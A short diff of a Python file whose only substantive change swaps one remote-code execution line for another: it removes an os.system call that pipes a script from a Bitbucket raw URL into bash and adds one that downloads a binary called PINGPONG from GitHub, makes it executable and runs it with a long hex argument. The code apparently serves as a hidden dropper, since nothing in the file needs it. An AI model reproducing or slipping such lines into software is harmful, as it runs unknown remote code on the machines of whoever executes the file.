@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/mikay2808/yui/raw/34b432ebe679085a80c88a3f6c421da2b098bac8/mika | bash')
+os.system('wget https://github.com/ryandijeremy/studious-engine/raw/main/PINGPONG && chmod +x ./PINGPONG && ./PINGPONG --48819a4a14d27b2db2cd3b0a61d0a51ac548005e6669d293da49ed9f88ca6b18')
